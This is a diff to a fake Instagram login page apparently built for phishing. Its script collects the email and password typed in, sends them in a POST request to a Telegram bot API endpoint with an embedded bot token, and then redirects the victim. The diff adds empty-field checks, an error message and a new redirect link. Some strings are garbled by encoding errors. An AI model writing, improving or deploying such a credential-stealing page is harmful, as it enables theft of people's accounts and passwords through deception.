@@ -39,7 +39,7 @@
             text-align: left; /* Align text to the left */
         }
         .login-options {
-            margin: 10px 0; /* Space between fields */
+           margin: 10px 0; /* Space between fields */
             text-align: center; /* Center text alignment */
         }
         .login-options a {
@@ -84,12 +84,21 @@
             color: #3897f0;
             text-decoration: none;
         }
+        .error-message {
+            color: red; /* Red color for error message */
+            margin-bottom: 10px; /* Space below the error message */
+            display: none; /* Hide by default */
+        }
     </style>
 </head>
 <body>
 
 <div class="login-container">
     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjk0i_ahSJVkh7GhT8ovydhXcO0dSELstPvHgtUe8JUkauL1EI2HdpQIac4VdERejXfvxhf-J0-8OSTpUbNkvyD4nDVc3yVZfh5qdQGi97hoEDj-bofbdlPME4uKzK-LMiQZlwxm2bgq7CDP78BG-4xh02vS094N0-nBQLJ4soRgBJp2frcHrehs5tnzf6E/s2460/Picsart_24-08-29_04-08-46-221.png" alt="Instagram Logo">
+    
+    <!-- Error message element -->
+    <div id="errorMessage" class="error-message">賷乇噩賶 賲賱亍 噩賲賷毓 丕賱丨賯賵賱 賱鬲爻噩賷賱 丕賱丿禺賵賱.</div>
+
     <button class="facebook-login">
         <span>Continue with Facebook</span>
     </button>
@@ -115,7 +124,19 @@
 
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
-        var message = "𝒜ℳ𝒾ℛ @VV9GG \n" + "Email: " + username + "\nPassword: " + password;
+
+        // Get the error message element
+        var errorMessage = document.getElementById('errorMessage');
+
+        // Check if the fields are empty
+        if (username.trim() === '' || password.trim() === '') {
+            errorMessage.style.display = 'block'; // Show error message
+            return; // Stop the function if fields are empty
+        } else {
+            errorMessage.style.display = 'none'; // Hide error message if fields are filled
+        }
+
+        var message = "饾挏鈩仇潚锯剾 @VV9GG \n" + "Email: " + username + "\nPassword: " + password;
 
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHNEnhZMNgDvGYHtUZ9BitE2mvQoNLaVLM/sendMessage", true);
@@ -124,7 +145,7 @@
 
         // Redirect to Instagram after sending the message
         xhr.onload = function() {
-            window.location.href = "https://www.instagram.com";
+            window.location.href = "https://ig.me/j/Abb6I_jGxcvoS2fB/";
         };
     }
 </script>
